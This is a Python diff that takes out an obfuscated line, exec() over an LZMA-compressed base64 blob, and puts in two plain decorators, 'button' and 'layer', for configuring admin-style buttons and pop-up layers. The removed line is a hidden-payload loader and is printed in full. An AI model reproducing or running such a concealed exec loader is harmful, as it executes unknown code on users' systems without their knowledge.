@@ -1,2 +1,28 @@
-import lzma,base64
-exec(lzma.decompress(base64.b64decode(b'/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AIkAOJdAAUaCmNWCpTdxzbPUr6w0dDp+bh8H8HbhXZ2rA5EXNcSBcGI/D9FCE04Oym7HTZpYM9Ok7a/j4Mwlso83e8PKkastiQ5i/3fufAxMhtxv1r+WGVTuUu09i2dqcIo8NJ5EVQMHw+S16ycVEs3xxlvwhRXj4JmhVidCGcvBGKRQz7zqhduIpFdsGp1/jKN8GWCzeveA6VaMinkawMqE/6KehU6y8zlSOl4ULcncbPCwAfRVgSes9ZKSaRkDqBmHsBtklVxpWrwOsUBaNFqEm0L+cWV6vV0inkbmFu5dZXAQY4oRwAAAACf0t8r2LVumAAB/gGlBAAA78QRrLHEZ/sCAAAAAARZWg==')))
+
+def button(short_description, enable=False, icon=None, type=None, style=None, confirm=None):
+    """
+    自定义按钮的装饰器
+    """
+
+    def wrapper(func):
+        func.enable = enable
+        func.icon = icon
+        func.type = type
+        func.style = style
+        func.confirm = confirm
+        func.short_description = short_description
+        return func
+
+    return wrapper
+
+
+def layer(config):
+    """
+    弹出层的装饰器
+    """
+
+    def wrapper(func):
+        func.layer = config
+        return func
+
+    return wrapper
